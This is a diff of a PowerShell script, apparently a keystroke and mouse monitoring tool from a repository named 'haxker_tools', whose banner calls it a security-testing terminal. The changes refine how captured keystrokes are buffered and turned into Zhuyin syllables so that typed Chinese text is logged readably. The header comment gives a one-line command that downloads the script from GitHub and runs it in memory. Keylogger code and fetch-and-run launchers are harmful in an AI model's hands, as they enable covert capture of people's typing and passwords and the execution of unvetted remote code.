@@ -1,9 +1,6 @@
 # 請使用以下方法進行參數傳送
 # & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 10
 
-# 請使用以下方法進行參數傳送
-# & ([scriptblock]::Create((iwr -UseBasicParsing "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/input_log/log.txt").Content)) -time 10
-
 param(
     [Parameter(Mandatory=$true)]
     [int]$time
@@ -201,9 +198,9 @@ $type = $compiledTypes | Where-Object { $_.Name -eq $className }
 
 # ANSI 色彩控制碼
 $ESC = [char]27
-$cReset       = "$ESC[0m"
-$cGray        = "$ESC[90m"  # 時間戳記：深灰色
-$cBlue        = "$ESC[94m"  # 數字/秒數：藍色
+$cReset        = "$ESC[0m"
+$cGray         = "$ESC[90m"  # 時間戳記：深灰色
+$cBlue         = "$ESC[94m"  # 數字/秒數：藍色
 $cBrightGreen = "$ESC[92m"  # X座標 / s單位：鮮綠色
 $cBrightRed   = "$ESC[91m"  # Y座標：鮮紅色
 $cCyan        = "$ESC[96m"  # 點擊元件名稱：亮青色
@@ -342,7 +339,7 @@ function Get-CurrentLanguage {
     if ($hwnd -eq [IntPtr]::Zero) { return $null }
     
     $processId = [uint32]0
-    $threadId = $type::GetWindowThreadProcessId($hwnd, $ref = [ref]$processId)
+    $threadId = $type::GetWindowThreadProcessId($hwnd, [ref]$processId)
     if ($threadId -eq 0) { return $null }
     
     $layout = $type::GetKeyboardLayout($threadId)
@@ -372,130 +369,59 @@ function Get-CurrentLanguage {
     return "$langName$imeMode"
 }
 
-# 聰明注音轉換核心演算法
-function Convert-ToZhuyin {
-    param ([string]$rawText)
-
-    if ([string]::IsNullOrEmpty($rawText)) { return "" }
-
-    # 標準大千鍵盤自訂注音對照表
-    $zhuyinMap = @{
-        '1' = @{ Symbol = 'ㄅ'; Type = 'Init' }
-        'q' = @{ Symbol = 'ㄆ'; Type = 'Init' }
-        'a' = @{ Symbol = 'ㄇ'; Type = 'Init' }
-        'z' = @{ Symbol = 'ㄈ'; Type = 'Init' }
-        '2' = @{ Symbol = 'ㄉ'; Type = 'Init' }
-        'w' = @{ Symbol = 'ㄊ'; Type = 'Init' }
-        's' = @{ Symbol = 'ㄋ'; Type = 'Init' }
-        'x' = @{ Symbol = 'ㄌ'; Type = 'Init' }
-        'e' = @{ Symbol = 'ㄍ'; Type = 'Init' }
-        'd' = @{ Symbol = 'ㄎ'; Type = 'Init' }
-        'c' = @{ Symbol = 'ㄏ'; Type = 'Init' }
-        'r' = @{ Symbol = 'ㄐ'; Type = 'Init' }
-        'f' = @{ Symbol = 'ㄑ'; Type = 'Init' }
-        'v' = @{ Symbol = 'ㄒ'; Type = 'Init' }
-        '5' = @{ Symbol = 'ㄓ'; Type = 'Init' }
-        't' = @{ Symbol = 'ㄔ'; Type = 'Init' }
-        'g' = @{ Symbol = 'ㄕ'; Type = 'Init' }
-        'b' = @{ Symbol = 'ㄖ'; Type = 'Init' }
-        'y' = @{ Symbol = 'ㄗ'; Type = 'Init' }
-        'h' = @{ Symbol = 'ㄘ'; Type = 'Init' }
-        'n' = @{ Symbol = 'ㄙ'; Type = 'Init' }
-
-        'u' = @{ Symbol = 'ㄧ'; Type = 'Med' }
-        'j' = @{ Symbol = 'ㄨ'; Type = 'Med' }
-        'm' = @{ Symbol = 'ㄩ'; Type = 'Med' }
-
-        '8' = @{ Symbol = 'ㄚ'; Type = 'Fin' }
-        'i' = @{ Symbol = 'ㄛ'; Type = 'Fin' }
-        'k' = @{ Symbol = 'ㄜ'; Type = 'Fin' }
-        ',' = @{ Symbol = 'ㄝ'; Type = 'Fin' }
-        '9' = @{ Symbol = 'ㄞ'; Type = 'Fin' }
-        'o' = @{ Symbol = 'ㄟ'; Type = 'Fin' }
-        'l' = @{ Symbol = 'ㄠ'; Type = 'Fin' }
-        '.' = @{ Symbol = 'ㄡ'; Type = 'Fin' }
-        '0' = @{ Symbol = 'ㄢ'; Type = 'Fin' }
-        'p' = @{ Symbol = 'ㄣ'; Type = 'Fin' }
-        ';' = @{ Symbol = 'ㄤ'; Type = 'Fin' }
-        '/' = @{ Symbol = 'ㄥ'; Type = 'Fin' }
-        '-' = @{ Symbol = 'ㄦ'; Type = 'Fin' }
-
-        ' ' = @{ Symbol = 'ˉ'; Type = 'Tone' } # 一聲使用 ˉ
-        '6' = @{ Symbol = 'ˊ'; Type = 'Tone' }
-        '3' = @{ Symbol = 'ˇ'; Type = 'Tone' }
-        '4' = @{ Symbol = 'ˋ'; Type = 'Tone' }
-        '7' = @{ Symbol = '˙'; Type = 'Tone' }
-    }
-
-    $result = New-Object System.Text.StringBuilder
-
-    $script:sInit = ""
-    $script:sMed  = ""
-    $script:sFin  = ""
-    $script:sTone = ""
-
-    $flushSyllable = {
-        $syl = "$script:sInit$script:sMed$script:sFin$script:sTone"
-        if ($syl.Length -gt 0) {
-            $null = $result.Append($syl)
-            $script:sInit = ""
-            $script:sMed  = ""
-            $script:sFin  = ""
-            $script:sTone = ""
-        }
-    }
-
-    for ($idx = 0; $idx -lt $rawText.Length; $idx++) {
-        $ch = $rawText[$idx].ToString().ToLower()
-
-        if ($zhuyinMap.ContainsKey($ch)) {
-            $item = $zhuyinMap[$ch]
-            $type = $item.Type
-            $sym  = $item.Symbol
-
-            if ($type -eq 'Tone') {
-                if ($ch -eq ' ' -and $script:sInit -eq "" -and $script:sMed -eq "" -and $script:sFin -eq "") {
-                    $null = $result.Append(" ")
-                } else {
-                    $script:sTone = $sym
-                    & $flushSyllable
-                }
-            }
-            elseif ($type -eq 'Init') {
-                # 聰明邏輯：若已有聲母，新產生的聲母會自動覆蓋前一個聲母
-                $script:sInit = $sym
-            }
-            elseif ($type -eq 'Med') {
-                $script:sMed = $sym
-            }
-            elseif ($type -eq 'Fin') {
-                $script:sFin = $sym
-            }
-        } else {
-            & $flushSyllable
-            $null = $result.Append($rawText[$idx])
-        }
-    }
-
-    & $flushSyllable
-    return $result.ToString()
-}
-
 # 建立按鍵文字緩衝區
 $textBuffer = New-Object System.Text.StringBuilder
 
+# --- 自訂注音鍵盤對照表與狀態變數 ---
+$zhuyinInitials = @{
+    '1'='ㄅ'; 'q'='ㄆ'; 'Q'='ㄆ'; 'a'='ㄇ'; 'A'='ㄇ'; 'z'='ㄈ'; 'Z'='ㄈ'
+    '2'='ㄉ'; 'w'='ㄊ'; 'W'='ㄊ'; 's'='ㄋ'; 'S'='ㄋ'; 'x'='ㄌ'; 'X'='ㄌ'
+    'e'='ㄍ'; 'E'='ㄍ'; 'd'='ㄎ'; 'D'='ㄎ'; 'c'='ㄏ'; 'C'='ㄏ'
+    'r'='ㄐ'; 'R'='ㄐ'; 'f'='ㄑ'; 'F'='ㄑ'; 'v'='ㄒ'; 'V'='ㄒ'
+    '5'='ㄓ'; 't'='ㄔ'; 'T'='ㄔ'; 'g'='ㄕ'; 'G'='ㄕ'; 'b'='ㄖ'; 'B'='ㄖ'
+    'y'='ㄗ'; 'Y'='ㄗ'; 'h'='ㄘ'; 'H'='ㄘ'; 'n'='ㄙ'; 'N'='ㄙ'
+}
+
+$zhuyinMedials = @{
+    'u'='ㄧ'; 'U'='ㄧ'; 'j'='ㄨ'; 'J'='ㄨ'; 'm'='ㄩ'; 'M'='ㄩ'
+}
+
+$zhuyinFinals = @{
+    '8'='ㄚ'; 'i'='ㄛ'; 'I'='ㄛ'; 'k'='ㄜ'; 'K'='ㄜ'; ','='ㄝ'
+    '9'='ㄞ'; 'o'='ㄟ'; 'O'='ㄟ'; 'l'='ㄠ'; 'L'='ㄠ'; '.'='ㄡ'
+    '0'='ㄢ'; 'p'='ㄣ'; 'P'='ㄣ'; ';'='ㄤ'; '/'='ㄥ'; '-'='ㄦ'
+}
+
+$zhuyinTones = @{
+    ' ' = 'ˉ' # 一聲
+    '6' = 'ˊ' # 二聲
+    '3' = 'ˇ' # 三聲
+    '4' = 'ˋ' # 四聲
+    '7' = '˙' # 輕聲
+}
+
+$script:zhInitial = ""
+$script:zhMedial  = ""
+$script:zhFinal   = ""
+$script:zhHistory = New-Object System.Collections.Generic.List[string]
+
+function Commit-ZhuyinSyllable([string]$tone = "") {
+    $syllable = "$script:zhInitial$script:zhMedial$script:zhFinal$tone"
+    if ($syllable.Length -gt 0) {
+        $null = $textBuffer.Append($syllable)
+    }
+    $script:zhInitial = ""
+    $script:zhMedial  = ""
+    $script:zhFinal   = ""
+    $script:zhHistory.Clear()
+}
+
 function Flush-TextBuffer {
+    Commit-ZhuyinSyllable
     if ($textBuffer.Length -gt 0) {
         $str = $textBuffer.ToString().Trim()
         if ($str.Length -gt 0) {
-            $currLang = Get-CurrentLanguage
-            # 根據當前或切換前的語系狀態判斷是否需要轉注音
-            if ($currLang -like "*[中]*" -or $lastLanguage -like "*[中]*") {
-                $displayStr = Convert-ToZhuyin $str
-            } else {
-                $displayStr = $str
-            }
-            Write-Host "$(Get-TimeStamp)📝 [輸入文字段落] -> `"$displayStr`"" -ForegroundColor Yellow
+            Write-Host "$(Get-TimeStamp)📝 [輸入文字段落] -> `"$str`"" -ForegroundColor Yellow
         }
         $null = $textBuffer.Clear()
     }
@@ -527,7 +453,7 @@ $lastSinglePressPosStr = ""
 $lastSinglePressElemStr = ""
 
 Write-Host "====================================================" -ForegroundColor Cyan
-Write-Host "  資安測試終端：網址/文字/UI控制項/鍵盤/滑鼠監控" -ForegroundColor Cyan
+Write-Host "   資安測試終端：網址/文字/UI控制項/鍵盤/滑鼠監控" -ForegroundColor Cyan
 Write-Host "====================================================" -ForegroundColor Cyan
 Write-Host ""
 if ($lastLanguage) {
@@ -630,33 +556,64 @@ while ($true) {
 
                 # --- 按鍵緩衝區 (Text Buffer) 邏輯 ---
                 if (-not $isMouse) {
+                    $isChineseMode = ($lastLanguage -and $lastLanguage.Contains("[中]"))
+
                     if ($vk -eq 8) { # Backspace 刪除鍵
-                        if ($textBuffer.Length -gt 0) {
+                        if ($isChineseMode -and ($script:zhInitial -or $script:zhMedial -or $script:zhFinal)) {
+                            if ($script:zhHistory.Count -gt 0) {
+                                $lastSlot = $script:zhHistory[$script:zhHistory.Count - 1]
+                                $script:zhHistory.RemoveAt($script:zhHistory.Count - 1)
+                                switch ($lastSlot) {
+                                    'I' { $script:zhInitial = "" }
+                                    'M' { $script:zhMedial  = "" }
+                                    'F' { $script:zhFinal   = "" }
+                                }
+                            }
+                        } elseif ($textBuffer.Length -gt 0) {
                             $null = $textBuffer.Remove($textBuffer.Length - 1, 1)
                         }
                     } elseif ($vk -eq 13 -or $vk -eq 9 -or $vk -eq 27) { # Enter / Tab / ESC 觸發 Flush
                         Flush-TextBuffer
-                    } elseif ($vk -eq 32) { # Space 空格鍵
-                        $null = $textBuffer.Append(" ")
-                    } elseif ($vk -ge 32 -and $vk -ne 91 -and $vk -ne 92) { # 一般可列印字元
+                    } else { # 可列印字元或空白鍵
                         $ch = $type::VkToChar($vk, $keyStateBuffer)
-                        if (-not $ch -or $ch.Length -eq 0) {
-                            $kName = Get-KeyName $vk
-                            if ($kName.Length -eq 1) { $ch = $kName.ToLower() }
-                            elseif ($vk -eq 186) { $ch = ";" }
-                            elseif ($vk -eq 187) { $ch = "=" }
-                            elseif ($vk -eq 188) { $ch = "," }
-                            elseif ($vk -eq 189) { $ch = "-" }
-                            elseif ($vk -eq 190) { $ch = "." }
-                            elseif ($vk -eq 191) { $ch = "/" }
-                            elseif ($vk -eq 192) { $ch = "`" }
-                            elseif ($vk -eq 219) { $ch = "[" }
-                            elseif ($vk -eq 220) { $ch = "\" }
-                            elseif ($vk -eq 221) { $ch = "]" }
-                            elseif ($vk -eq 222) { $ch = "'" }
-                        }
                         if ($ch -and $ch.Length -gt 0 -and [int][char]$ch[0] -ge 32) {
-                            $null = $textBuffer.Append($ch)
+                            if ($isChineseMode) {
+                                $hasZhBuffer = [bool]($script:zhInitial -or $script:zhMedial -or $script:zhFinal)
+
+                                if ($zhuyinTones.ContainsKey($ch)) {
+                                    if ($ch -eq ' ') {
+                                        if ($hasZhBuffer) {
+                                            Commit-ZhuyinSyllable $zhuyinTones[' ']
+                                        } else {
+                                            $null = $textBuffer.Append(" ")
+                                        }
+                                    } else {
+                                        if ($hasZhBuffer) {
+                                            Commit-ZhuyinSyllable $zhuyinTones[$ch]
+                                        } else {
+                                            Commit-ZhuyinSyllable
+                                            $null = $textBuffer.Append($ch)
+                                        }
+                                    }
+                                } elseif ($zhuyinInitials.ContainsKey($ch)) {
+                                    $script:zhInitial = $zhuyinInitials[$ch]
+                                    if ($script:zhHistory.Contains('I')) { $script:zhHistory.Remove('I') }
+                                    $script:zhHistory.Add('I')
+                                } elseif ($zhuyinMedials.ContainsKey($ch)) {
+                                    $script:zhMedial = $zhuyinMedials[$ch]
+                                    if ($script:zhHistory.Contains('M')) { $script:zhHistory.Remove('M') }
+                                    $script:zhHistory.Add('M')
+                                } elseif ($zhuyinFinals.ContainsKey($ch)) {
+                                    $script:zhFinal = $zhuyinFinals[$ch]
+                                    if ($script:zhHistory.Contains('F')) { $script:zhHistory.Remove('F') }
+                                    $script:zhHistory.Add('F')
+                                } else {
+                                    Commit-ZhuyinSyllable
+                                    $null = $textBuffer.Append($ch)
+                                }
+                            } else {
+                                $null = $textBuffer.Append($ch)
+                            }
                         }
                     }
                 }
